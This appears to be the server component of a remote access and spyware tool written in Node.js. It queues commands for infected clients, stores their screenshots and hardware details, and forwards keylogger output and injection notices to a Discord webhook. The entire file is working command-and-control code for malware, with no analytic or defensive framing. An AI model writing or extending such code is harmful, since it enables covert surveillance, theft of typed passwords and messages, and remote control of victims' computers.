// server.js
const http = require('http');
const fetch = require('node-fetch');

let lastCommand = "";
let lastArgs = [];
let lastScreenshot = null;
let hardwareData = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/ваш_вебхук";

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                
                if (data.command === "user_chat" || data.command === "inject_notify" || data.command === "execute_log") {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**${data.args[0]}:** ${data.args[1]}`
                        })
                    }).catch(console.error);
                } else if (data.command === "hardware") {
                    hardwareData = data.data;
                }

                lastCommand = data.command;
                lastArgs = data.args || [];
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { logs } = JSON.parse(body);
                
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**Keylogger Data:**\n\`\`\`\n${logs}\n\`\`\``
                    })
                }).catch(console.error);
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        res.end(JSON.stringify({
            command: lastCommand,
            args: lastArgs
        }));
        lastCommand = "";
        return;
    }

    if (req.method === 'GET' && req.url === '/hardware') {
        if (hardwareData) {
            res.end(JSON.stringify(hardwareData));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No hardware data available" }));
        }
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(process.env.PORT || 3000, () => {
    console.log("Сервер запущен на порту 3000");
});
